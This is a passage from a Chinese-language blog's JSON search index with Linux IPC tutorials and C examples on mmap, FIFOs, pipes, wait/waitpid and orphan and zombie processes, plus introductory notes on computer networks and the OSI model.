fd, 0); if(addr==MAP_FAILED) &#123; perror(\"mmap error\"); return -1; &#125; close(fd); //创建子进程 pid_t pid = fork(); if(pid&lt;0) &#123; perror(\"fork error\"); return -1; &#125; else if(pid&gt;0) &#123; memcpy(addr, \"hello world\", strlen(\"hello world\")); wait(NULL); &#125; else if(pid==0) &#123; sleep(1); char *p = (char *)addr; printf(\"[%s]\", p); &#125; return 0;&#125; 练习3：使用mmap完成没有血缘关系的进程间通 思路：两个进程都打开相同的文件，然后调用mmap函数建立存储映射区，这样两个进程共享同一个存储映射区。 mmap_read 12345678910111213141516171819202122232425262728293031323334353637383940//使用mmap函数完成两个不相干进程间通信#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/mman.h&gt;int main()&#123; //使用mmap函数建立共享映射区 //void *mmap(void *addr, size_t length, int prot, int flags, // int fd, off_t offset); int fd = open(\"./test.log\", O_RDWR); if(fd&lt;0) &#123; perror(\"open error\"); return -1; &#125; int len = lseek(fd, 0, SEEK_END); //建立共享映射区 void * addr = mmap(NULL, len, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0); if(addr==MAP_FAILED) &#123; perror(\"mmap error\"); return -1; &#125; char buf[64]; memset(buf, 0x00, sizeof(buf)); memcpy(buf, addr, 10); printf(\"buf=[%s]\\n\", buf); return 0;&#125; mmap_write 12345678910111213141516171819202122232425262728293031323334353637//使用mmap函数完成两个不相干进程间通信#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/mman.h&gt;int main()&#123; //使用mmap函数建立共享映射区 //void *mmap(void *addr, size_t length, int prot, int flags, // int fd, off_t offset); int fd = open(\"./test.log\", O_RDWR); if(fd&lt;0) &#123; perror(\"open error\"); return -1; &#125; int len = lseek(fd, 0, SEEK_END); //建立共享映射区 void * addr = mmap(NULL, len, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0); if(addr==MAP_FAILED) &#123; perror(\"mmap error\"); return -1; &#125; memcpy(addr, \"0123456789\", 10); return 0;&#125; 使用mmap函数建立匿名映射： 必须是有血缘关系之间的进程使用 1mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); MAP_ANONYMOUS必须和MAP_SHARED一起使用，而且fd指定为-1 1234567891011121314151617181920212223242526272829303132333435363738394041424344//使用mmap匿名映射完成父子进程间通信#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/mman.h&gt;int main()&#123; //使用mmap函数建立共享映射区 //void *mmap(void *addr, size_t length, int prot, int flags, // int fd, off_t offset); void * addr = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0); if(addr==MAP_FAILED) &#123; perror(\"mmap error\"); return -1; &#125; //创建子进程 pid_t pid = fork(); if(pid&lt;0) &#123; perror(\"fork error\"); return -1; &#125; else if(pid&gt;0) &#123; memcpy(addr, \"hello world\", strlen(\"hello world\")); wait(NULL); &#125; else if(pid==0) &#123; sleep(1); char *p = (char *)addr; printf(\"[%s]\", p); &#125; return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"fifo函数","slug":"linux070fifo函数","date":"2022-01-17T10:59:33.000Z","updated":"2022-01-17T17:01:09.628Z","comments":true,"path":"2022/01/17/linux070fifo函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/17/linux070fifo函数/","excerpt":"","text":"FIFO介绍 FIFO常被称为命名管道，以区分管道(pipe)。管道(pipe)只能用于“有血缘关系”的进程间通信。但通过FIFO，不相关的进程也能交换数据。 ​ FIFO是Linux基础文件类型中的一种（文件类型为p，可通过ls -l查看文件类型）。但FIFO文件在磁盘上没有数据块，文件大小为0，仅仅用来标识内核中一条通道。进程可以打开这个文件进行read/write，实际上是在读写内核缓冲区，这样就实现了进程间通信。 创建管道 方式1-使用命令 mkfifo 命令格式： 1mkfifo 管道名 例如：mkfifo myfifo 方式2-使用函数 12345int mkfifo(const char *pathname, mode_t mode);参数一是文件名参数2是文件权限成功返回0失败返回-1并设置errno 参数说明和返回值可以查看man 3 mkfifo 当创建了一个FIFO，就可以使用open函数打开它，常见的文件I/O函数都可用于FIFO。如：close、read、write、unlink等。 FIFO严格遵循先进先出（first in first out），对FIFO的读总是从开始处返回数据，对它们的写则把数据添加到末尾。它们不支持诸如lseek()等文件定位操作。 access函数 1#include&lt;unistd.h&gt; 函数声明 1int access(const char* pathname, int mode); 123456789F_OK 值为0，判断文件是否存在 X_OK 值为1，判断对文件是可执行权限 W_OK 值为2，判断对文件是否有写权限 R_OK 值为4，判断对文件是否有读权限 注：后三种可以使用或“|”的方式，一起使用，如W_OK|R_OK 返回值：成功0，失败-1 使用FIFO完成两个进程通信 使用FIFO完成两个进程通信的示意图 fifo_write.c 1234567891011121314151617181920212223242526272829303132333435363738394041#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;fcntl.h&gt;#include&lt;string.h&gt;int main(int argc,char * argv[])&#123; int ret = access(\"./myfifo\",F_OK); //判断文件是否存在 if(ret != 0) &#123; //创建管道文件 ret = mkfifo(\"myfifo\",0777); if(ret &lt; 0)&#123; perror(\"mkfifo error\"); return -1; &#125; &#125; //打开管道文件 int fd = open(\"./myfifo\",O_RDWR); if(fd &lt; 0)&#123; perror(\"open error\"); return -1; &#125; //创建缓冲区并且初始化为0 char buf[128]; memset(buf,0x00,sizeof(buf)); int i = 0; while(1) &#123; sprintf(buf,\"%d hello\\n\",++i); //写数据到管道文件 write(fd,buf,strlen(buf)); sleep(1); &#125; close(fd); return 0;&#125; fifo_read.c 1234567891011121314151617181920212223242526272829303132#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;sys/types.h&gt;#include&lt;sys/stat.h&gt;#include&lt;fcntl.h&gt;#include&lt;string.h&gt;int main(int argc,char * argv[])&#123; //打开管道文件 int fd = open(\"./myfifo\",O_RDWR); if(fd &lt; 0)&#123; perror(\"open error\"); return -1; &#125; char buf[128]; int i = 0; int len = 0; while(1) &#123; memset(buf,0x00,sizeof(buf)); //读管道文件 len = read(fd,buf,sizeof(buf)); printf(\"len[%d] %s\",len,buf); &#125; close(fd); return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"如何查看管道缓冲区大小","slug":"linux069如何查看管道缓冲区大小","date":"2022-01-17T10:58:01.000Z","updated":"2022-01-17T11:03:34.143Z","comments":true,"path":"2022/01/17/linux069如何查看管道缓冲区大小/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/17/linux069如何查看管道缓冲区大小/","excerpt":"","text":"命令 1ulimit -a 函数 12345long fpathconf(int fd, int name);printf(&quot;pipe size==[%ld]\\n&quot;, fpathconf(fd[0], _PC_PIPE_BUF));printf(&quot;pipe size==[%ld]\\n&quot;, fpathconf(fd[1], _PC_PIPE_BUF)); 12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;sys/types.h&gt;#include&lt;unistd.h&gt;#include&lt;string.h&gt;#include&lt;wait.h&gt;int main(int argc,char *argv[])&#123; int fd[2] = &#123;0&#125;; int ret = pipe(fd); if(ret == -1)&#123; perror(\"pipe error\"); exit(-1); &#125; //获取管道缓冲区大小 printf(\"pipe size [%ld]\\n\",fpathconf(fd[0],_PC_PIPE_BUF)); pid_t pid = fork(); if(pid == -1) &#123; perror(\"fork error\"); exit(-1); &#125; if(pid &gt; 0) &#123; close(fd[0]); write(fd[1],\"hello pipe!\",sizeof(\"hello pipe!\")); close(fd[1]); wait(NULL); &#125; if(pid == 0)&#123; char buf[1024]; close(fd[1]); read(fd[0],buf,1024); printf(\"%s\\n\",buf); &#125; return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"设置管道为非阻塞方式","slug":"linux068设置管道为非阻塞方式","date":"2022-01-16T18:27:23.000Z","updated":"2022-01-16T18:29:52.837Z","comments":true,"path":"2022/01/17/linux068设置管道为非阻塞方式/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/17/linux068设置管道为非阻塞方式/","excerpt":"","text":"默认情况下，管道的读写两端都是阻塞的，若要设置读或者写端为非阻塞，则可参 考下列三个步骤进行： 第1步：int flags = fcntl(fd[0], F_GETFL, 0); 第2步： flag |= O_NONBLOCK; 第3步： fcntl(fd[0], F_SETFL, flags); 若是读端设置为非阻塞： 写端没有关闭，管道中没有数据可读，则read返回-1； 写端没有关闭，管道中有数据可读，则read返回实际读到的字节数 写端已经关闭，管道中有数据可读，则read返回实际读到的字节数 写端已经关闭，管道中没有数据可读，则read返回0 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;fcntl.h&gt;int main()&#123; //创建管道 //int pipe(int pipefd[2]); int fd[2]; int ret = pipe(fd); if(ret&lt;0) &#123; perror(\"pipe error\"); return -1; &#125; printf(\"pipe size==[%ld]\\n\", fpathconf(fd[0], _PC_PIPE_BUF)); printf(\"pipe size==[%ld]\\n\", fpathconf(fd[1], _PC_PIPE_BUF)); //close(fd[0]); //write(fd[1], \"hello world\", strlen(\"hello world\")); //关闭写端 close(fd[1]); //设置管道的读端为非阻塞 int flag = fcntl(fd[0], F_GETFL); flag |= O_NONBLOCK; fcntl(fd[0], F_SETFL, flag); char buf[64]; memset(buf, 0x00, sizeof(buf)); int n = read(fd[0], buf, sizeof(buf)); printf(\"read over, n==[%d], buf==[%s]\\n\", n, buf); return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"管道的读写行为","slug":"linux067管道的读写行为","date":"2022-01-16T17:54:45.000Z","updated":"2022-01-16T18:26:56.422Z","comments":true,"path":"2022/01/17/linux067管道的读写行为/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/17/linux067管道的读写行为/","excerpt":"","text":"读操作 有数据 read正常读，返回读出的字节数 无数据 1.写端全部关闭 read解除阻塞，返回0, 相当于读文件读到了尾部 2.没有全部关闭 read阻塞 写操作 读端全部关闭 管道破裂，进程终止, 内核给当前进程发SIGPIPE信号 读端没全部关闭 1.缓冲区写满了 write阻塞 2.缓冲区没有满 继续write 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;#include &lt;fcntl.h&gt;int main()&#123; //创建管道 //int pipe(int pipefd[2]); int fd[2]; int ret = pipe(fd); if(ret&lt;0) &#123; perror(\"pipe error\"); return -1; &#125; printf(\"pipe size==[%ld]\\n\", fpathconf(fd[0], _PC_PIPE_BUF)); printf(\"pipe size==[%ld]\\n\", fpathconf(fd[1], _PC_PIPE_BUF)); close(fd[0]); while(1) &#123; write(fd[1], \"hello world\", strlen(\"hello world\")); &#125; //关闭写端 close(fd[1]); char buf[64]; memset(buf, 0x00, sizeof(buf)); int n = read(fd[0], buf, sizeof(buf)); printf(\"read over, n==[%d], buf==[%s]\\n\", n, buf); return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"父子进程执行ps_aux_grep_bash思路分析和实现","slug":"linux066父子进程执行ps-aux-grep-bash思路分析和实现","date":"2022-01-16T16:35:18.000Z","updated":"2022-05-23T02:40:01.417Z","comments":true,"path":"2022/01/17/linux066父子进程执行ps-aux-grep-bash思路分析和实现/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/17/linux066父子进程执行ps-aux-grep-bash思路分析和实现/","excerpt":"","text":"输入grep bash 回车之后默认情况下是等待终端输入数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//使用pipe完成ps aux | grep bash操作#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;int main()&#123; //创建管道 //int pipe(int pipefd[2]); int fd[2]; int ret = pipe(fd); if(ret&lt;0) &#123; perror(\"pipe error\"); return -1; &#125; //创建子进程 pid_t pid = fork(); if(pid&lt;0) &#123; perror(\"fork error\"); return -1; &#125; else if(pid&gt;0) &#123; //关闭读端 close(fd[0]); //将标准输出重定向到管道的写端 dup2(fd[1], STDOUT_FILENO); execlp(\"ps\", \"ps\", \"aux\", NULL); perror(\"execlp error\"); &#125; else &#123; //关闭写端 close(fd[1]); //将标准输入重定向到管道的读端 dup2(fd[0], STDIN_FILENO); execlp(\"grep\", \"grep\", \"--color=auto\", \"bash\", NULL); perror(\"execlp error\"); &#125; return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"pipe函数","slug":"linux065pipe函数","date":"2022-01-15T05:49:44.000Z","updated":"2022-01-15T09:47:53.212Z","comments":true,"path":"2022/01/15/linux065pipe函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/15/linux065pipe函数/","excerpt":"","text":"管道的概念 管道是一种最基本的IPC机制，也称匿名管道，应用于有血缘关系的进程之间，完成数据传递。调用pipe函数即可创建一个管道。 有如下特质： 管道的本质是一块内核缓冲区 由两个文件描述符引用，一个表示读端，一个表示写端。 规定数据从管道的写端流入管道，从读端流出。 当两个进程都终结的时候，管道也自动消失。 管道的读端和写端默认都是阻塞的。 管道的原理 管道的实质是内核缓冲区，内部使用环形队列实现。 默认缓冲区大小为4K，可以使用ulimit -a命令获取大小。 实际操作过程中缓冲区会根据数据压力做适当调整。 管道的局限性 数据一旦被读走，便不在管道中存在，不可反复读取。 数据只能在一个方向上流动，若要实现双向流动，必须使用两个管道 只能在有血缘关系的进程间使用管道。 总结: 1.管道的本质是一块内核缓冲区,内部的实现是环形队列 2.管道有读写两端,读写两端是两个文件描述符 3.数据的流向是从管道的写端流到管道的读端(数据的流向是单向的) 4.数据被读走之后,在管道中就消失 5.pipe只能用于有血缘关系的进程间通信 6.管道的读写两端是阻塞的(写满数据阻塞，没读到数据阻塞) 7.管道的大小默认是4K,但是会根据实际情况做适当调整 创建管道pipe函数 函数作用: 创建一个管道 头文件 1#include &lt;unistd.h&gt; 函数原型: 1int pipe(int fd[2]); 函数参数: 若函数调用成功，fd[0]存放管道的读端，fd[1]存放管道的写端 返回值: 成功返回0； 失败返回-1，并设置errno值。 ​ 函数调用成功返回读端和写端的文件描述符，其中fd[0]是读端， fd[1]是写端，向管道读写数据是通过使用这两个文件描述符进行的，读写管道的实质是操作内核缓冲区。 管道创建成功以后，创建该管道的进程（父进程）同时掌握着管道的读端和写端。如何实现父子进程间通信呢？ 父子进程使用管道通信 一个进程在由pipe()创建管道后，一般再fork一个子进程，然后通过管道实现父子进程间的通信（因此也不难推出，只要两个进程中存在血缘关系，这里的血缘关系指的是具有共同的祖先，都可以采用管道方式来进行通信）。父子进程间具有相同的文件描述符，且指向同一个管道pipe，其他没有关系的进程不能获得pipe（）产生的两个文件描述符，也就不能利用同一个管道进行通信。 第一步：父进程创建管道 第二步：父进程fork出子进程 第三步：父进程关闭fd[0]，子进程关闭fd[1] 创建步骤总结： 父进程调用pipe函数创建管道，得到两个文件描述符fd[0]和fd[1]，分别指向管道的读端和写端。 父进程调用fork创建子进程，那么子进程也有两个文件描述符指向同一管。 父进程关闭管道读端，子进程关闭管道写端。父进程可以向管道中写入数据，子进程将管道中的数据读出，这样就实现了父子进程间通信。 pipe用于父子进程间通信: 1.父进程创建pipe 2.父进程调用fork函数创建子进程 3.父进程关闭一端 4.子进程关闭一端 5.父进程和子进程分别执行read或者write操作 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;int main()&#123; //创建管道 //int pipe(int pipefd[2]); int fd[2]; int ret = pipe(fd); /*子进程会复制一份fd,然后内核计数读和写fd各变成2*/ if(ret&lt;0) &#123; perror(\"pipe error\"); return -1; &#125; //创建子进程 pid_t pid = fork(); if(pid&lt;0) &#123; perror(\"fork error\"); return -1; &#125; else if(pid&gt;0) &#123; //关闭读端 close(fd[0]); sleep(5); write(fd[1], \"hello world\", strlen(\"hello world\")); wait(NULL); &#125; else &#123; //关闭写端 close(fd[1]); char buf[64]; memset(buf, 0x00, sizeof(buf)); int n = read(fd[0], buf, sizeof(buf)); printf(\"read over, n==[%d], buf==[%s]\\n\", n, buf); &#125; return 0;&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"进程间通信的基本概念","slug":"linux064进程间通信的基本概念","date":"2022-01-15T05:43:20.000Z","updated":"2022-01-15T08:57:08.028Z","comments":true,"path":"2022/01/15/linux064进程间通信的基本概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/15/linux064进程间通信的基本概念/","excerpt":"","text":"什么是进程间通信 Linux环境下，进程地址空间相互独立，每个进程各自有不同的用户地址空间。任何一个进程的全局变量在另一个进程中都看不到，所以进程和进程之间不能相互访问，要交换数据必须通过内核，在内核中开辟一块缓冲区，进程1把数据从用户空间拷到内核缓冲区，进程2再从内核缓冲区把数据读走，内核提供的这种机制称为进程间通信（IPC，InterProcess Communication）。 进程间通信的方式 在进程间完成数据传递需要借助操作系统提供特殊的方法，如：文件、管道、信号、共享内存、消息队列、套接字、命名管道等。随着计算机的蓬勃发展，一些方法由于自身设计缺陷被淘汰或者弃用。现今常用的进程间通信方式有： 管道 (使用最简单) 信号 (开销最小) 共享映射区 (无血缘关系) 本地套接字 (最稳定) 父子进程可以共享文件 两个进程要想完成数据交换,必须通过内核； 一个进程将数据写到内核，然后另一个进程从内核中读走数据 IPC：进程间通信（interprocess communication）","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"第一章计算机网络概述","slug":"计算机网络概述","date":"2022-01-13T16:56:27.000Z","updated":"2022-01-16T14:22:09.558Z","comments":true,"path":"2022/01/14/计算机网络概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/14/计算机网络概述/","excerpt":"","text":"局域网 每一间课室的电脑都连接到同一台交换机上,楼道上会形成很多网线,不雅观 电脑到交换机距离的网线不超过100米，交换机到交换机的网线也不超过一百米 接入层交换机的接口比较多，汇聚层的接口比较少，但要求输入和输出的带宽高 中间的网线承担了两个课室的流量，不规范 总结：局域网覆盖范围小，自己花钱买设备带宽固定，自己维护 Intenet和广域网 Intenet有很多 IPS运营商组成，他们都有自己的机房，对网民提供访问Internet连接（可以是ADSL或光纤） 广域网：距离远（可以超过100米） 花钱租带宽 我们买的带宽是指从我们这里到运营商那一段的带宽，比如我们拉了100兆的网线，意思就是从我们这里到运营商接口那里是100兆的 公网地址是全球唯一的，不会重复 规划IP地址介绍MAC地址 一般路由器地址是自己网段的第一个地址 例如自己网段是13.0.0.0 路由器地址就是13.0.0.1 MAC地址：网卡生产时的物理地址，48位二进制表示，也是全球唯一，不重复的 网关: 数据到其他网段需要给的机器(一般是路由器) DNS：解析域名的服务器，比如我们打开www.baidu.com，电脑会先请求DNS服务器，然后DNS服务器会返回一个域名对应的ip地址回来 数据包和数据帧 IP地址决定最后给谁 MAC地址决定下一跳给谁 数据包最大1500字节,如果数据超过1500个字节会切片,然后给每个数据包编号 访问网站数据传输过程 网站服务器收到请求之后会将网页打包成很多数据包，每个数据包都有编号，然后再一个个放到网卡缓存里，每个数据包都有源ip地址，目标ip地址，源mac地址和目标mac地址。 数据包发送到客户机网卡的缓存之后，客户机会发送接收下一个数据包的请求，然后服务器收到之后会将上一个发送的数据包删除掉，再发下一个数据包。 客户机会一边接收数据包，一边将数据包排好序一个个的显示出来，最终形成一个网页 OSI参考模型 应用层:所有能产生网络流量的程序 表示层:在传输之前是否进行加密或压缩处理,是二进制数据还是ASCII数据 会话层: 查木马netstat -n,一般连接网络的软件都会建立会话 传输层:可靠传输 、流量控制、不可控传输 网络层：负责选择最佳路径 规划IP地址 数据链路层：帧的开始和结束、透明传输、差错校验 物理层：接口标准、电器标准、如何在物理链路上传输更快的速度 理解OSI参考模型分层思想 网络七层模型之间有相对独立性，每一层的变化一般不会对其他层有影响。一个计算机可以加多ip地址 OSI参考模型和网络排错 网络出现问题,应该从物理层开始往上排查 物理层故障：网线断了是物理层故障,发送有包，接收没包，需要检查一下网线水晶头（接触不良） 数据链路层故障：MAC地址冲突、ADSL欠费、接口网速协商不一致（强制性）、计算机连接到错的VLAN 网络层故障：没有配网关、配置错误的IP地址，子网掩码，路由器没有配置到达目标网络的路由 应用层故障：应用程序配置错误（代理配置错误等） OSI参考模型和网络安全 网络安全-OSI模型各层的安全 1.物理层：把用不到的口关掉。 2.数据链路层：ADSL拨号的账号密码；无线网络要输数据密码；划分VLAN，在交换机上创建虚拟局域网；交换机端口绑定MAC地址。 3.网络层：在路由器上使用ACL控制数据包流量（路由器可以控制哪个网段可以访问哪个网络）。Windows防火墙设置； 4.应用层：开发的应用程序没有漏洞，SQL注入漏洞等。 OSI参考模型和TCP/IP协议 TCP/IP协议栈一共五层:应用层、传输层、网络层、数据链路层、物理层。 ARP协议为IP协议提供服务，IP协议为ICMP和IGMP协议提供服务。 应用层：准备要发送的数据 传输层：将数据分段编号 网络层：为要发送的数据加上IP地址或去掉接收到的数据中的IP地址。 数据链路层：添加或去掉MAC地址和校验值 FCS：差错校验 计算机网络性能指标 1.速率（比特率）：连接在计算机网络上的主机在数字信道上传达数据位数的速率。b/s，kb/s,Mb/s,Gb/s。（一般看到的是byte/s，需要bit/s除以8） 网络100M指的是100Mbit 速率是指一个发送端一个接收端每秒中传输的bit 2.带宽：网络设备支持的最高速度，单位是b/s Kb/s Mb/s Gb/s 3.吞吐量：单位时间内通过某个网络的数据量。b/s,Mb/s…。 一般指的是各个信道速率之和 4.时延：发送时延=数据块长度（bit）/信道带宽(bit/s)；传播时延；处理时延；接收时延。光纤的支持更高的发送速度，但传播速度没有比铜线快，光纤每秒传输20.5万公里，铜线每秒传输23.1万公里。 从网络的一端传输到另一端所需要的时间 给网络设备增加带宽可以减少发送时延，但不可以无限增加，发送时延越小，数据长度越窄 5.时延带宽积=传播时延*带宽。（传输线路上的数据量） 6.往返时间（round-trip time）：从发送方发送数据开始，到发送方收到接收方确认。ping 命令可以查看。 7.网络利用率：1）信道利用率=有数据通过时间/（有+无）数据通过时间。2）网络利用率：信道利用率加权平均值。3）网络当前时延=网络空闲时的时延/（1-信道利用率）。","categories":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络原理/"}],"tags":[]},{"title":"进程回收函数","slug":"linux063进程回收函数","date":"2022-01-12T08:07:38.000Z","updated":"2022-01-12T17:59:27.383Z","comments":true,"path":"2022/01/12/linux063进程回收函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/12/linux063进程回收函数/","excerpt":"","text":"wait函数 头文件 12#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt; 函数原型： 1pid_t wait(int *status); 函数作用： 阻塞并等待子进程退出 回收子进程残留资源 获取子进程结束状态(退出原因)。 返回值： 成功：清理掉的子进程ID； 失败：-1 (没有子进程) status参数：子进程的退出状态 – 传出参数 1234567WIFEXITED(status)：为非0 → 进程正常结束WEXITSTATUS(status)：获取进程退出状态 WIFSIGNALED(status)：为非0 → 进程异常终止WTERMSIG(status)：取得进程终止的信号编号。 wait函数练习 使用wait函数完成父进程对子进程的回收 waitpid函数 头文件 12#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt; 函数原型： 1pid_t waitpid(pid_t pid, int *status, in options); 函数作用 同wait函数 函数参数 参数： pid： pid = -1 等待任意一个子进程。与wait等效。 pid &gt; 0 等待其进程ID与pid相等的子进程。等待指定的pid pid = 0 等待进程组ID与目前进程相同的任何子进程，也就是说任何和调用 waitpid()函数的进程在同一个进程组的进程。 pid &lt; -1 等待其组ID等于pid的绝对值的任一子进程。(适用于子进程在其他组的情况) status: 子进程的退出状态，用法同wait函数。 options：设置为WNOHANG，函数非阻塞，设置为0，函数阻塞。 调用一次wait或waitpid只能回收一个子进程 函数返回值 12345&gt;0：返回回收掉的子进程ID；-1：无子进程=0：参3为WNOHANG，且子进程正在运行。 12345678910111213141516171819202122232425262728293031323334353637383940414243//父进程调用wait函数完成对子进程的回收#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;int main()&#123; //创建子进程 pid_t pid = fork(); if(pid&lt;0) //fork失败的情况 &#123; perror(\"fork error\"); return -1; &#125; else if(pid&gt;0)//父进程 &#123; printf(\"father: [%d], pid==[%d], fpid==[%d]\\n\", pid, getpid(),getppid()); int status; pid_t wpid = wait(&amp;status); printf(\"wpid==[%d]\\n\", wpid); if(WIFEXITED(status)) //正常退出 &#123; printf(\"child normal exit, status==[%d]\\n\", WEXITSTATUS(status)); &#125; else if(WIFSIGNALED(status)) //被信号杀死 &#123; printf(\"child killed by signal, signo==[%d]\\n\", WTERMSIG(status)); &#125; &#125; else if(pid==0) //子进程 &#123; printf(\"child: pid==[%d], fpid==[%d]\\n\", getpid(), getppid()); sleep(20); return 9; &#125; return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;int main()&#123; //创建子进程 pid_t pid = fork(); if(pid&lt;0) //fork失败的情况 &#123; perror(\"fork error\"); return -1; &#125; else if(pid&gt;0)//父进程 &#123; printf(\"father: [%d], pid==[%d], fpid==[%d]\\n\", pid, getpid(),getppid()); int status; //pid_t wpid = wait(&amp;status); while(1)&#123; pid_t wpid = waitpid(-1,&amp;status,WNOHANG); //printf(\"wpid==[%d]\\n\", wpid); if(wpid &gt; 0) &#123; if(WIFEXITED(status)) //正常退出 &#123; printf(\"child normal exit, status==[%d]\\n\", WEXITSTATUS(status)); &#125; else if(WIFSIGNALED(status)) //被信号杀死 &#123; printf(\"child killed by signal, signo==[%d]\\n\", WTERMSIG(status)); &#125; &#125;else if(wpid == 0) //子进程还活着 &#123; // printf(\"child is living,wpid[%d]\\n\",wpid); &#125;else if(wpid == -1) &#123; printf(\"no child is living wpid[%d]\\n\",wpid); break; &#125; &#125; &#125; else if(pid==0) //子进程 &#123; printf(\"child: pid==[%d], fpid==[%d]\\n\", getpid(), getppid()); sleep(2); return 9; &#125; return 0;&#125; sleep函数 1#include &lt;unistd.h&gt; 1sleep(5); //表示睡眠5秒","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"孤儿进程和僵尸进程","slug":"linux062孤儿进程和僵尸进程","date":"2022-01-12T07:24:59.000Z","updated":"2022-01-12T07:32:54.843Z","comments":true,"path":"2022/01/12/linux062孤儿进程和僵尸进程/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/01/12/linux062孤儿进程和僵尸进程/","excerpt":"","text":"为什么要进行进程资源的回收 当一个进程退出之后，进程能够回收自己的用户区的资源，但是不能回收内核空间的PCB资源，必须由它的父进程调用wait或者waitpid函数完成对子进程的回收，避免造成系统资源的浪费。 孤儿进程 孤儿进程的概念： 若子进程的父进程已经死掉，而子进程还存活着，这个进程就成了孤儿进程。 为了保证每个进程都有一个父进程，孤儿进程会被init进程领养，init进程成为了孤儿进程的养父进程，当孤儿进程退出之后，由init进程完成对孤儿进程的回收。 模拟孤儿进程的案例 编写模拟孤儿进程的代码讲解孤儿进程，验证孤儿进程的父进程是否由原来的父进程变成了init进程。 僵尸进程 僵尸进程的概念: 若子进程死了，父进程还活着， 但是父进程没有调用wait或waitpid函数完成对子进程的回收，则该子进程就成了僵尸进程。 如何解决僵尸进程 由于僵尸进程是一个已经死亡的进程，所以不能使用kill命令将其杀死 通过杀死其父进程的方法可以消除僵尸进程。 杀死其父进程后，这个僵尸进程会被init进程领养，由init进程完成对僵尸进程的回收。 模拟僵尸进程的案例 1234567891011121314151617181920212223242526272829303132//孤儿进程#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main()&#123; //创建子进程 pid_t pid = fork(); if(pid&lt;0) //fork失败的情况 &#123; perror(\"fork error\"); return -1; &#125; else if(pid&gt;0)//父进程 &#123; sleep(5); printf(\"father: [%d], 